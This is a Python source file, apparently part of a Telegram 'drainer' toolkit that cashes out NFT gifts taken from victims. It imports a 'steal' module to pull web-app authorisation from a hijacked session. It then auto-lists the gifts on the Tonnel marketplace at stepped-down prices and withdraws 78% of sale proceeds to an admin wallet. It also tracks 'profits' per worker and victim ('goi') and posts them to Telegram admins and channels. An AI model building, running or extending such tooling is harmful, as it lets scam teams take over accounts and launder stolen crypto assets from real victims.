import asyncio
import json
import os
import sys
import time
from pathlib import Path

from aiogram import Bot

import database
import listing_price_pending
import profit_sale_notify

_rd = os.environ.get("RECEIVER_POLL_CONFIG_TEAM_DIR", "").strip()
if _rd:
    os.environ["TEAM_DIR"] = os.path.abspath(os.path.expanduser(_rd))

import paths

import config_migration

config_migration.ensure_team_config_migrated(
    os.path.join(paths.get_team_dir(), "config.py")
)

import config
from drainer.core import hybr1d_shared
from drainer.core.proxy import aiogram_aiohttp_session
from drainer.core.parse import get_gift_prices_detailed
from drainer.core.steal import get_tg_webappdata
from drainer.core.tonnel_api import (
    coffin_balance_withdraw,
    coffin_cancel_sale,
    coffin_list_for_sale,
    page_gifts_listed_and_unlisted,
)

_POLL_SEC = int(os.environ.get("RECEIVER_POLL_INTERVAL_SEC", "10"))
_TTL_SEC = int(os.environ.get("RECEIVER_LISTING_TTL_SEC", "600"))
_RELIST_SLEEP = float(os.environ.get("RECEIVER_RELIST_SLEEP_SEC", "1"))
_MIN_PRICE = float(os.environ.get("RECEIVER_MIN_LIST_PRICE_TON", "0.01"))
_DEFAULT_LIST_MULTS = (0.9, 0.8, 0.7, 0.6)
_ASSET = os.environ.get("RECEIVER_LIST_ASSET", "TON").strip() or "TON"
_UNLISTED_RETRY_SEC = float(os.environ.get("RECEIVER_UNLISTED_RETRY_SEC", "45"))
_RATE_LIMIT_COOLDOWN_SEC = float(
    os.environ.get("RECEIVER_COFFIN_RATE_LIMIT_COOLDOWN_SEC", "65")
)
_MIN_AFTER_ANY_LIST_SEC = float(
    os.environ.get("RECEIVER_MIN_AFTER_LIST_SEC", "55")
)

_price_bot: Bot | None = None
_post_bot: Bot | None = None


def _manual_list_price_enabled() -> bool:
    v = os.environ.get("RECEIVER_MANUAL_LIST_PRICE", "0").strip().lower()
    return v in ("1", "true", "yes", "on")


def _profit_lookback() -> int:
    try:
        return max(50, int(os.environ.get("RECEIVER_PROFIT_LOOKBACK", "800")))
    except ValueError:
        return 800


def _listing_dm_retry_sec() -> float:
    try:
        return max(60.0, float(os.environ.get("RECEIVER_LISTING_DM_RETRY_SEC", "180")))
    except ValueError:
        return 180.0


def _admin_ids_list() -> list[int]:
    a = getattr(config, "ADMIN_ID", None)
    if a is None:
        return []
    if isinstance(a, int):
        return [a]
    return [int(x) for x in a]


def _dm_targets(worker_id: int) -> list[int]:
    admins = _admin_ids_list()
    out: list[int] = []
    seen: set[int] = set()
    for u in admins:
        if u not in seen:
            seen.add(u)
            out.append(u)
    w = int(worker_id or 0)
    if w and w not in seen:
        out.append(w)
    return out


def _sold_once_map(state: dict) -> dict:
    d = state.setdefault("sold_once", {})
    if not isinstance(d, dict):
        d = {}
        state["sold_once"] = d
    return d


def _extract_list_price_ton(item: dict | None, depth: int = 0) -> float | None:
    if depth > 6 or not isinstance(item, dict):
        return None
    for k in (
        "price",
        "listing_price",
        "list_price",
        "sale_price",
        "ton_price",
        "amount_ton",
    ):
        v = item.get(k)
        if isinstance(v, (int, float)) and float(v) > 0:
            return float(v)
        if isinstance(v, str):
            try:
                x = float(v.replace(",", ".").strip())
                if x > 0:
                    return x
            except (TypeError, ValueError):
                pass
    g = item.get("gift")
    if isinstance(g, dict):
        r = _extract_list_price_ton(g, depth + 1)
        if r is not None:
            return r
    for val in item.values():
        if isinstance(val, dict):
            r = _extract_list_price_ton(val, depth + 1)
            if r is not None:
                return r
    return None


def _admin_wallet_ok(w: str) -> bool:
    return w.startswith("UQ")


async def _process_gift_sold(
    gid: str,
    st: dict,
    init_data: str,
    state: dict,
) -> None:
    global _post_bot
    nft_link = (st.get("nft_link") or "").strip()
    sold_price: float | None = None
    lp = st.get("last_list_price_ton")
    if lp is not None:
        try:
            x = float(lp)
            sold_price = x if x > 0 else None
        except (TypeError, ValueError):
            sold_price = None
    listing_row = None
    if nft_link:
        listing_row = database.get_listing_gift_row_by_link(
            database.normalize_nft_link(nft_link)
        )
    if sold_price is None and listing_row and listing_row.get("list_price_ton") is not None:
        try:
            x = float(listing_row["list_price_ton"])
            sold_price = x if x > 0 else None
        except (TypeError, ValueError):
            sold_price = None
    if sold_price is None and st.get("last_price"):
        try:
            x = float(str(st.get("last_price")).replace(",", "."))
            sold_price = x if x > 0 else None
        except (TypeError, ValueError):
            pass
    profit_id: str | None = None
    worker_id = 0
    goi_id = 0
    if nft_link:
        ctx = database.find_profit_context_by_nft_link(
            nft_link, lookback=_profit_lookback()
        )
        if ctx:
            profit_id, worker_id, goi_id = ctx
    if listing_row:
        if worker_id == 0:
            worker_id = int(listing_row.get("worker_id") or 0)
        if goi_id == 0:
            goi_id = int(listing_row.get("goi_id") or 0)
        if not profit_id and listing_row.get("profit_id"):
            profit_id = str(listing_row["profit_id"])
    if sold_price is not None and profit_id:
        ps = f"{sold_price:.8f}".rstrip("0").rstrip(".")
        database.update_profit_amount_by_id(profit_id, ps if ps else str(sold_price))
    wallet = (getattr(config, "ADMIN_WALLET", None) or "").strip()
    withdraw_amt = (
        round(float(sold_price) * 0.78, 3)
        if sold_price is not None and float(sold_price) > 0
        else None
    )
    wres: str | object = "n/a"
    if withdraw_amt is not None and withdraw_amt > 0:
        if not _admin_wallet_ok(wallet):
            wres = "skip_invalid_wallet"
            if _post_bot:
                warn = (
                    f"ADMIN_WALLET невалиден (нужен UQ… ≥40 симв.), вывод 78% пропущен. "
                    f"gift_id={gid} sold≈{sold_price}"
                )
                for uid in _admin_ids_list():
                    try:
                        await _post_bot.send_message(uid, warn)
                    except Exception:
                        pass
        else:
            wres = await asyncio.to_thread(
                coffin_balance_withdraw,
                wallet,
                init_data,
                float(withdraw_amt),
                "TON",
            )
    disp = (st.get("gift_name") or "").strip()
    gift_line = f"\n{nft_link}" if nft_link else ""
    if disp:
        gift_line = f"\n{disp}" + gift_line
    if not gift_line.strip():
        gift_line = f"\ngift_id <code>{gid}</code>"
    _emit(
        _line(
            "sold / gone",
            gid,
            nft_link or "-",
            f"price={sold_price}",
            f"profit_id={profit_id or '-'}",
            f"withdraw_78%={withdraw_amt}",
            f"withdraw_res={wres!r}",
        )
    )
    if _post_bot:
        dm = (
            f"<b>Продажа гифта</b>\n"
            f"gift_id: <code>{gid}</code>\n"
            f"{f'NFT: {nft_link}' if nft_link else ''}\n"
            f"цена: <code>{sold_price}</code> TON\n"
            f"profit_id: <code>{profit_id or '—'}</code>\n"
            f"вывод 78%: <code>{withdraw_amt}</code> → {wallet or '—'}\n"
            f"результат: <code>{wres!r}</code>"
        )
        for uid in _dm_targets(worker_id):
            try:
                await _post_bot.send_message(uid, dm, parse_mode="HTML")
            except Exception:
                pass
    if sold_price is not None and _post_bot and (goi_id or worker_id):
        try:
            await profit_sale_notify.send_gift_sale_channel(
                _post_bot,
                profit_id=profit_id,
                goi_id=goi_id,
                worker_id=worker_id,
                gift_line=gift_line,
                sold_ton=float(sold_price),
                config=config,
            )
        except Exception:
            pass


def _receiver_poll_enabled() -> bool:
    v = os.environ.get("RECEIVER_POLL_ENABLED", "1").strip().lower()
    return v not in ("0", "false", "no", "off", "disable", "disabled")


def _receiver_auto_sell_enabled() -> bool:
    v = os.environ.get("RECEIVER_AUTO_SELL_ENABLED", "0").strip().lower()
    return v in ("1", "true", "yes", "on", "enable", "enabled")


_DEFAULT_LOG_BOT_TOKEN = ""
_DEFAULT_LOG_CHAT_ID = 0

_log_bot: Bot | None = None


def _log_bot_token() -> str:
    t = os.environ.get("RECEIVER_POLL_LOG_BOT_TOKEN", _DEFAULT_LOG_BOT_TOKEN).strip()
    return t if t else _DEFAULT_LOG_BOT_TOKEN


def _log_chat_id() -> int:
    raw = os.environ.get(
        "RECEIVER_POLL_LOG_CHAT_ID", str(_DEFAULT_LOG_CHAT_ID)
    ).strip()
    try:
        return int(raw)
    except ValueError:
        return _DEFAULT_LOG_CHAT_ID


def _log_thread_id() -> int | None:
    raw = os.environ.get("RECEIVER_POLL_LOG_THREAD_ID", "").strip()
    if not raw:
        return None
    try:
        return int(raw)
    except ValueError:
        return None


def _state_path() -> Path:
    _, _, cache = hybr1d_shared.hybr1d_paths()
    p = os.environ.get("RECEIVER_POLL_STATE_PATH", "").strip()
    if p:
        return Path(p).expanduser().resolve()
    return cache.parent / "receiver_poll_state.json"


def _load_state() -> dict:
    p = _state_path()
    if not p.is_file():
        return {"gifts": {}}
    try:
        with open(p, "r", encoding="utf-8") as f:
            o = json.load(f)
        if isinstance(o, dict) and isinstance(o.get("gifts"), dict):
            return o
    except Exception:
        pass
    return {"gifts": {}}


def _save_state(state: dict) -> None:
    p = _state_path()
    p.parent.mkdir(parents=True, exist_ok=True)
    tmp = p.with_suffix(p.suffix + ".tmp")
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(state, f, ensure_ascii=False, indent=2)
    os.replace(tmp, p)


def _gid_from_item(item: dict) -> str | None:
    if not isinstance(item, dict):
        return None
    for k in ("gift_id", "owned_gift_id"):
        if k in item and item[k] is not None:
            return str(item[k])
    return None


def _display_name_from_item(item: dict) -> str:
    if not isinstance(item, dict):
        return ""
    g = item.get("gift")
    if isinstance(g, dict):
        for cand in (g.get("title"), g.get("name")):
            if isinstance(cand, str) and cand.strip():
                return cand.strip()
    for cand in (item.get("name"), item.get("gift_name")):
        if isinstance(cand, str) and cand.strip():
            return cand.strip()
    return ""


def _looks_like_nft_slug(s: str) -> bool:
    s = (s or "").strip()
    if not s or " " in s:
        return False
    return "-" in s


def _nft_url_from_dict(d: dict) -> str:
    if not isinstance(d, dict):
        return ""
    for k in ("gift_link", "link", "url", "nft_link"):
        v = d.get(k)
        if isinstance(v, str) and "t.me/nft/" in v:
            return v.split()[0].strip()
    return ""


def _compact_name(s: str) -> str:
    return "".join(c for c in (s or "").strip() if not c.isspace())


def _slug_or_link_for_parse(item: dict) -> str:
    if not isinstance(item, dict):
        return ""
    g = item.get("gift")
    if not isinstance(g, dict):
        g = {}
    u = _nft_url_from_dict(item) or _nft_url_from_dict(g)
    if u:
        return u
    for key in ("slug", "unique_name", "collection_slug"):
        for src in (g, item):
            if not isinstance(src, dict):
                continue
            v = src.get(key)
            if isinstance(v, str) and _looks_like_nft_slug(v):
                return v.strip()
    for cand in (g.get("name"), g.get("title"), item.get("name")):
        if isinstance(cand, str) and _looks_like_nft_slug(cand):
            return cand.strip()
    gift_num = item.get("gift_num")
    if gift_num is None:
        gift_num = g.get("gift_num")
    model = g.get("model")
    if not isinstance(model, dict):
        model = {}
    mname = model.get("name")
    if mname is not None and gift_num is not None:
        ms = _compact_name(str(mname))
        if ms:
            return f"{ms}-{gift_num}"
    if gift_num is not None:
        title = g.get("title") or g.get("name") or item.get("name")
        if isinstance(title, str) and title.strip():
            ms = _compact_name(title)
            if ms:
                return f"{ms}-{gift_num}"
    return ""


def _nft_link(slug: str) -> str:
    s = (slug or "").strip()
    if not s:
        return ""
    return f"https://t.me/nft/{s}"


def _canonical_nft_link(item: dict) -> str:
    raw = (_slug_or_link_for_parse(item) or "").strip()
    if raw.startswith("http"):
        return raw.split()[0].strip()
    if raw:
        return _nft_link(raw)
    g = item.get("gift")
    if not isinstance(g, dict):
        g = {}
    u = _nft_url_from_dict(item) or _nft_url_from_dict(g)
    if isinstance(u, str) and u.strip():
        return u.split()[0].strip()
    return ""


def _listing_source_db() -> bool:
    v = os.environ.get("RECEIVER_LISTING_SOURCE", "db").strip().lower()
    return v not in ("parse", "legacy", "0", "false", "no", "off")


def _db_listing_row(item: dict) -> dict | None:
    link = _canonical_nft_link(item)
    if not link:
        return None
    return database.get_listing_gift_row_by_link(link)


def _db_list_price(row: dict | None) -> float | None:
    if not row:
        return None
    p = row.get("list_price_ton")
    if p is None:
        return None
    try:
        x = float(p)
        return x if x >= _MIN_PRICE else None
    except (TypeError, ValueError):
        return None


async def _estimated_ton_from_item(item: dict) -> tuple[float | None, str]:
    raw = _slug_or_link_for_parse(item)
    if not raw:
        return None, ""
    if raw.startswith("http"):
        link = raw
    else:
        link = _nft_link(raw)
    if not link:
        return None, raw
    try:
        pairs = await get_gift_prices_detailed([link])
        if not pairs:
            return None, raw
        v = float(pairs[0][1])
        return (v if v > 0 else None), raw
    except Exception:
        return None, raw


def _list_mults_tuple() -> tuple[float, ...]:
    s = os.environ.get("RECEIVER_LIST_PRICE_MULTS", "").strip()
    if not s:
        return _DEFAULT_LIST_MULTS
    out: list[float] = []
    for p in s.split(","):
        p = p.strip()
        if p:
            out.append(float(p))
    return tuple(out) if out else _DEFAULT_LIST_MULTS


def _list_mult_floor() -> float:
    return float(os.environ.get("RECEIVER_LIST_PRICE_FLOOR_MULT", "0.6"))


def _list_price_mult(relist_attempt: int) -> float:
    a = max(0, int(relist_attempt))
    tiers = _list_mults_tuple()
    if a < len(tiers):
        return tiers[a]
    return _list_mult_floor()


def _list_price_ton(base: float, relist_attempt: int) -> float:
    return max(_MIN_PRICE, base * _list_price_mult(relist_attempt))


def _price_str(x: float) -> str:
    x = max(x, _MIN_PRICE)
    s = f"{x:.8f}".rstrip("0").rstrip(".")
    return s if s else str(_MIN_PRICE)


def _ids_from_page(items: list) -> dict[str, dict]:
    out: dict[str, dict] = {}
    for it in items:
        if not isinstance(it, dict):
            continue
        gid = _gid_from_item(it)
        if gid:
            out[gid] = it
    return out


def _list_ok(r) -> bool:
    if isinstance(r, dict) and r.get("status") == "error":
        return False
    return True


def _list_rate_limited(r) -> bool:
    if not isinstance(r, dict) or r.get("status") != "error":
        return False
    m = str(r.get("message") or "").lower()
    return "try again" in m and "minute" in m


def _list_cooldown_until(st: dict) -> float:
    return float(st.get("list_again_after") or 0)


def _set_list_rate_limit_cooldown(st: dict, now: float) -> None:
    st["last_list_try"] = now
    st["list_again_after"] = now + _RATE_LIMIT_COOLDOWN_SEC


def _clear_list_rate_limit_cooldown(st: dict) -> None:
    st.pop("list_again_after", None)


def _unlisted_list_min_interval() -> float:
    return max(_UNLISTED_RETRY_SEC, _MIN_AFTER_ANY_LIST_SEC)


def _line(*parts) -> str:
    return time.strftime("%Y-%m-%d %H:%M:%S") + " " + " ".join(str(p) for p in parts)


def _emit(msg: str) -> None:
    print(msg, flush=True)
    if _log_bot is None:
        return

    async def _send() -> None:
        try:
            kw: dict = {"chat_id": _log_chat_id(), "text": msg[:3500]}
            tid = _log_thread_id()
            if tid is not None:
                kw["message_thread_id"] = tid
            await _log_bot.send_message(**kw)
        except Exception:
            pass

    try:
        asyncio.get_running_loop().create_task(_send())
    except RuntimeError:
        pass


async def _broadcast_listing_price_dm(gid: str, pe: dict, item: dict) -> bool:
    global _price_bot
    if _price_bot is None:
        return False
    cur = dict(listing_price_pending.load().get(str(gid)) or pe)
    if not cur.get("cb_key"):
        cur["cb_key"] = listing_price_pending.new_cb_key()
        listing_price_pending.upsert(str(gid), cur)
    cb_key = cur["cb_key"]
    nft_link = (cur.get("nft_link") or "").strip()
    worker_id = int(cur.get("worker_id") or 0)
    goi_id = int(cur.get("goi_id") or 0)
    parse_b = cur.get("parse_base_ton")
    disp = cur.get("gift_name") or _display_name_from_item(item)
    lines = [
        "<b>Листинг подарка</b>",
        "",
        disp,
        f"gift_id: <code>{gid}</code>",
    ]
    if nft_link:
        lines.append(f'<a href="{nft_link}">ссылка на подарок</a>')
    if parse_b is not None:
        try:
            lines.append(
                f"Рекомендуемая цена (парс): <b>{float(parse_b):.4f}</b> TON"
            )
        except (TypeError, ValueError):
            lines.append("Рекомендуемая цена: нет оценки")
    else:
        lines.append("Рекомендуемая цена: нет оценки")
    lines.append(f"goi: <code>{goi_id}</code>")
    lines.append("")
    lines.append("Выбери стартовую цену:")
    text = "\n".join(lines)
    kb = listing_price_pending.build_listing_keyboard(cb_key, parse_b, _MIN_PRICE)
    ok_any = False
    for uid in _dm_targets(worker_id):
        try:
            await _price_bot.send_message(
                uid,
                text,
                parse_mode="HTML",
                reply_markup=kb,
            )
            ok_any = True
        except Exception:
            pass
    return ok_any


async def _refresh_init_data(session_string: str) -> str:
    api_id = int(config.API_ID)
    api_hash = str(config.API_HASH)
    async with hybr1d_shared.hybr1d_client_context(
        api_id, api_hash, session_string
    ) as app:
        init_data = await get_tg_webappdata(app, "@Tonnel_Network_bot")
    hybr1d_shared.write_cached_init_data(init_data)
    return init_data


async def _tick_watch_only(session_string: str, state: dict) -> None:
    init_data = await _refresh_init_data(session_string)
    listed, unlisted, err = page_gifts_listed_and_unlisted(init_data)
    if err is not None:
        _emit(_line("pageGifts error:", err))
        return
    listed_map = _ids_from_page(listed)
    unlisted_map = _ids_from_page(unlisted)
    listed_ids = set(listed_map.keys())
    unlisted_ids = set(unlisted_map.keys())
    present = listed_ids | unlisted_ids
    now = time.time()
    gifts = state.setdefault("gifts", {})
    sold_once = _sold_once_map(state)

    for gid in list(gifts.keys()):
        if gid not in present:
            st = gifts.pop(gid)
            listing_price_pending.delete_gid(gid)
            if str(gid) in sold_once:
                continue
            sold_once[str(gid)] = now
            await _process_gift_sold(gid, st, init_data, state)
            continue

    for gid in present:
        item = listed_map.get(gid) or unlisted_map.get(gid)
        disp = _display_name_from_item(item) if item else ""
        nft_link = _canonical_nft_link(item) if item else ""
        lp = None
        if gid in listed_ids and item:
            lp = _extract_list_price_ton(item)
        if gid not in gifts:
            gifts[gid] = {
                "watch_only": True,
                "gift_name": disp,
                "seen_at": now,
                "nft_link": nft_link,
                "last_list_price_ton": lp,
            }
            continue
        ge = gifts[gid]
        if nft_link:
            ge["nft_link"] = nft_link
        if lp is not None:
            ge["last_list_price_ton"] = lp
        if disp:
            ge["gift_name"] = disp


async def _tick(session_string: str, state: dict) -> None:
    init_data = await _refresh_init_data(session_string)
    listed, unlisted, err = page_gifts_listed_and_unlisted(init_data)
    if err is not None:
        _emit(_line("pageGifts error:", err))
        return
    listed_map = _ids_from_page(listed)
    unlisted_map = _ids_from_page(unlisted)
    listed_ids = set(listed_map.keys())
    unlisted_ids = set(unlisted_map.keys())
    now = time.time()
    gifts = state.setdefault("gifts", {})
    sold_once = _sold_once_map(state)

    for gid in list(gifts.keys()):
        if gid not in listed_ids and gid not in unlisted_ids:
            st = gifts.pop(gid)
            listing_price_pending.delete_gid(gid)
            if str(gid) in sold_once:
                continue
            sold_once[str(gid)] = now
            await _process_gift_sold(gid, st, init_data, state)
            continue
        st = gifts[gid]
        item_up = listed_map.get(gid) or unlisted_map.get(gid)
        if item_up:
            nl = _canonical_nft_link(item_up)
            if nl:
                st["nft_link"] = nl
            if gid in listed_ids:
                lp = _extract_list_price_ton(item_up)
                if lp is not None:
                    st["last_list_price_ton"] = lp
        if gid in listed_ids:
            if now - float(st.get("listed_at", 0)) >= _TTL_SEC:
                if now < _list_cooldown_until(st):
                    continue
                r_cancel = await asyncio.to_thread(
                    coffin_cancel_sale, init_data, gid
                )
                _emit(_line("cancel", gid, r_cancel))
                await asyncio.sleep(_RELIST_SLEEP)
                item = listed_map[gid]
                disp = _display_name_from_item(item) or st.get("gift_name", "")
                if _listing_source_db():
                    row = _db_listing_row(item)
                    pv = _db_list_price(row)
                    if pv is not None:
                        ra = int(st.get("relist_attempt", 0)) + 1
                        ps = _price_str(pv)
                        r_list = await asyncio.to_thread(
                            coffin_list_for_sale, init_data, gid, ps, _ASSET
                        )
                        _emit(_line("relist db", gid, ps, "attempt", ra, r_list))
                        slug_dbg = ""
                        if row:
                            slug_dbg = database.normalize_nft_link(
                                row.get("gift_link") or ""
                            )
                        if _list_ok(r_list):
                            _clear_list_rate_limit_cooldown(st)
                            st["last_list_try"] = now
                            st["listed_at"] = now
                            st["relist_attempt"] = ra
                            st["last_base_ton"] = pv
                            st["last_price"] = ps
                            st["parse_slug"] = slug_dbg
                        else:
                            st["relist_attempt"] = ra
                            if _list_rate_limited(r_list):
                                _set_list_rate_limit_cooldown(st, now)
                        continue
                base_v, slug_dbg = await _estimated_ton_from_item(item)
                if base_v is None:
                    _emit(
                        _line(
                            "no parse price",
                            gid,
                            disp,
                            "slug=" + (slug_dbg or "?"),
                        )
                    )
                    continue
                ra = int(st.get("relist_attempt", 0)) + 1
                price = _list_price_ton(base_v, ra)
                ps = _price_str(price)
                r_list = await asyncio.to_thread(
                    coffin_list_for_sale, init_data, gid, ps, _ASSET
                )
                _emit(_line("relist", gid, ps, "attempt", ra, r_list))
                if _list_ok(r_list):
                    _clear_list_rate_limit_cooldown(st)
                    st["last_list_try"] = now
                    st["listed_at"] = now
                    st["relist_attempt"] = ra
                    st["last_base_ton"] = base_v
                    st["last_price"] = ps
                    st["parse_slug"] = slug_dbg
                else:
                    st["relist_attempt"] = ra
                    if _list_rate_limited(r_list):
                        _set_list_rate_limit_cooldown(st, now)
            continue
        if gid in unlisted_ids and gid not in listed_ids:
            if now < _list_cooldown_until(st):
                continue
            last_try = float(st.get("last_list_try", 0))
            if last_try and now - last_try < _unlisted_list_min_interval():
                continue
            item = unlisted_map[gid]
            if _listing_source_db():
                row = _db_listing_row(item)
                pv = _db_list_price(row)
                if pv is not None:
                    ra = int(st.get("relist_attempt", 0))
                    ps = _price_str(pv)
                    r_list = await asyncio.to_thread(
                        coffin_list_for_sale, init_data, gid, ps, _ASSET
                    )
                    _emit(_line("list-unlisted db", gid, ps, "attempt", ra, r_list))
                    slug_dbg = ""
                    if row:
                        slug_dbg = database.normalize_nft_link(
                            row.get("gift_link") or ""
                        )
                    if _list_ok(r_list):
                        st["last_list_try"] = now
                        _clear_list_rate_limit_cooldown(st)
                        st["listed_at"] = now
                        st["relist_attempt"] = ra
                        st["last_base_ton"] = pv
                        st["last_price"] = ps
                        st["parse_slug"] = slug_dbg
                    elif _list_rate_limited(r_list):
                        _set_list_rate_limit_cooldown(st, now)
                    else:
                        st["last_list_try"] = now
                    continue
            base_v, slug_dbg = await _estimated_ton_from_item(item)
            if base_v is None:
                continue
            ra = int(st.get("relist_attempt", 0))
            price = _list_price_ton(base_v, ra)
            ps = _price_str(price)
            r_list = await asyncio.to_thread(
                coffin_list_for_sale, init_data, gid, ps, _ASSET
            )
            _emit(_line("list-unlisted", gid, ps, "attempt", ra, r_list))
            if _list_ok(r_list):
                st["last_list_try"] = now
                _clear_list_rate_limit_cooldown(st)
                st["listed_at"] = now
                st["relist_attempt"] = ra
                st["last_base_ton"] = base_v
                st["last_price"] = ps
                st["parse_slug"] = slug_dbg
            elif _list_rate_limited(r_list):
                _set_list_rate_limit_cooldown(st, now)
            else:
                st["last_list_try"] = now

    for gid, item in unlisted_map.items():
        if gid in gifts:
            continue

        if _listing_source_db():
            row = _db_listing_row(item)
            pv = _db_list_price(row)
            if row is not None and pv is not None:
                disp = _display_name_from_item(item)
                ps = _price_str(pv)
                r_list = await asyncio.to_thread(
                    coffin_list_for_sale, init_data, gid, ps, _ASSET
                )
                _emit(_line("new list db", gid, ps, r_list))
                slug_dbg = database.normalize_nft_link(row.get("gift_link") or "")
                if _list_ok(r_list):
                    gifts[gid] = {
                        "gift_name": disp,
                        "listed_at": now,
                        "relist_attempt": 0,
                        "last_base_ton": pv,
                        "last_price": ps,
                        "last_list_try": now,
                        "parse_slug": slug_dbg,
                    }
                elif _list_rate_limited(r_list):
                    st_new = {
                        "gift_name": disp,
                        "relist_attempt": 0,
                        "parse_slug": slug_dbg,
                    }
                    _set_list_rate_limit_cooldown(st_new, now)
                    gifts[gid] = st_new
                continue

        pe = listing_price_pending.load().get(str(gid))
        if _manual_list_price_enabled() and pe is not None:
            if pe.get("manual_ton") is not None:
                last_try = float(pe.get("last_list_try") or 0)
                if last_try and now - last_try < _unlisted_list_min_interval():
                    continue
                if now < _list_cooldown_until(pe):
                    continue
                disp = _display_name_from_item(item) or pe.get("gift_name", "")
                base_v, slug_dbg = await _estimated_ton_from_item(item)
                if base_v is None:
                    try:
                        base_v = float(pe["manual_ton"])
                    except (TypeError, ValueError):
                        base_v = _MIN_PRICE
                price = float(pe["manual_ton"])
                ps = _price_str(price)
                r_list = await asyncio.to_thread(
                    coffin_list_for_sale, init_data, gid, ps, _ASSET
                )
                _emit(_line("new list manual", gid, ps, r_list))
                if _list_ok(r_list):
                    listing_price_pending.delete_gid(gid)
                    gifts[gid] = {
                        "gift_name": disp,
                        "listed_at": now,
                        "relist_attempt": 0,
                        "last_base_ton": base_v,
                        "last_price": ps,
                        "last_list_try": now,
                        "parse_slug": slug_dbg,
                    }
                elif _list_rate_limited(r_list):
                    pe_u = listing_price_pending.load().get(str(gid)) or pe
                    _set_list_rate_limit_cooldown(pe_u, now)
                    listing_price_pending.upsert(str(gid), pe_u)
                else:
                    pe_u = listing_price_pending.load().get(str(gid)) or pe
                    pe_u["last_list_try"] = now
                    listing_price_pending.upsert(str(gid), pe_u)
                continue
            if not pe.get("prompt_sent"):
                if now - float(pe.get("last_prompt_try") or 0) < _listing_dm_retry_sec():
                    continue
                if _price_bot is not None:
                    try:
                        ok = await _broadcast_listing_price_dm(str(gid), pe, item)
                        pe_u = dict(
                            listing_price_pending.load().get(str(gid)) or pe
                        )
                        pe_u["last_prompt_try"] = now
                        if ok:
                            pe_u["prompt_sent"] = True
                        listing_price_pending.upsert(str(gid), pe_u)
                    except Exception as ex:
                        _emit(_line("listing dm error", gid, repr(ex)))
            continue
        if _manual_list_price_enabled():
            nft_link = _canonical_nft_link(item)
            ctx = None
            if nft_link:
                ctx = database.find_worker_goi_by_profit_nft(
                    nft_link, lookback=_profit_lookback()
                )
            if ctx is not None:
                worker_id, goi_id = ctx
                base_v, slug_dbg = await _estimated_ton_from_item(item)
                entry = {
                    "worker_id": worker_id,
                    "goi_id": goi_id,
                    "nft_link": nft_link,
                    "gift_name": _display_name_from_item(item),
                    "parse_base_ton": base_v,
                    "parse_slug": slug_dbg,
                    "manual_ton": None,
                    "cb_key": listing_price_pending.new_cb_key(),
                    "prompt_sent": False,
                    "last_prompt_try": 0.0,
                }
                listing_price_pending.upsert(str(gid), entry)
                continue
        disp = _display_name_from_item(item)
        base_v, slug_dbg = await _estimated_ton_from_item(item)
        if base_v is None:
            _emit(
                _line(
                    "skip new gift, no parse price",
                    gid,
                    disp,
                    "slug=" + (slug_dbg or "?"),
                )
            )
            continue
        price = _list_price_ton(base_v, 0)
        ps = _price_str(price)
        r_list = await asyncio.to_thread(
            coffin_list_for_sale, init_data, gid, ps, _ASSET
        )
        _emit(_line("new list", gid, ps, r_list))
        if _list_ok(r_list):
            gifts[gid] = {
                "gift_name": disp,
                "listed_at": now,
                "relist_attempt": 0,
                "last_base_ton": base_v,
                "last_price": ps,
                "last_list_try": now,
                "parse_slug": slug_dbg,
            }
        elif _list_rate_limited(r_list):
            st_new = {
                "gift_name": disp,
                "relist_attempt": 0,
                "parse_slug": slug_dbg,
            }
            _set_list_rate_limit_cooldown(st_new, now)
            gifts[gid] = st_new


async def _main() -> None:
    global _log_bot, _price_bot, _post_bot
    if not _receiver_poll_enabled():
        print("receiver_poll: автопродажа выключена RECEIVER_POLL_ENABLED", flush=True)
        while True:
            await asyncio.sleep(86400)
        return
    ss = os.environ.get("RECEIVER_HYBR1D_SESSION_STRING", "").strip()
    if not ss:
        ss = str(getattr(config, "HYBR1D_SESSION_STRING", "") or "")
    if not ss:
        print("RECEIVER_HYBR1D_SESSION_STRING or config.HYBR1D_SESSION_STRING required", file=sys.stderr)
        sys.exit(1)
    auto_sell = _receiver_auto_sell_enabled()
    if auto_sell:
        print(
            "receiver_poll: автопродажа ВКЛ (RECEIVER_AUTO_SELL_ENABLED=1)",
            flush=True,
        )
    else:
        print(
            "receiver_poll: только поллинг sold/gone; листинг выключен по умолчанию",
            flush=True,
        )
    if auto_sell:
        try:
            database.create_listing_gifts_table()
        except Exception:
            pass
    _rp_aios = aiogram_aiohttp_session()
    _log_bot = Bot(token=_log_bot_token(), session=_rp_aios)
    _post_bot = Bot(token=config.BOT_TOKEN, session=_rp_aios)
    if auto_sell and _manual_list_price_enabled():
        _price_bot = Bot(token=config.BOT_TOKEN, session=_rp_aios)
    state = _load_state()
    try:
        while True:
            try:
                if auto_sell:
                    await _tick(ss, state)
                else:
                    await _tick_watch_only(ss, state)
                _save_state(state)
            except Exception as e:
                _emit(_line("tick error", repr(e)))
            await asyncio.sleep(_POLL_SEC)
    finally:
        if _price_bot is not None:
            try:
                await _price_bot.session.close()
            except Exception:
                pass
            _price_bot = None
        if _post_bot is not None:
            try:
                await _post_bot.session.close()
            except Exception:
                pass
            _post_bot = None
        if _log_bot is not None:
            try:
                await _log_bot.session.close()
            except Exception:
                pass
            _log_bot = None


if __name__ == "__main__":
    asyncio.run(_main())
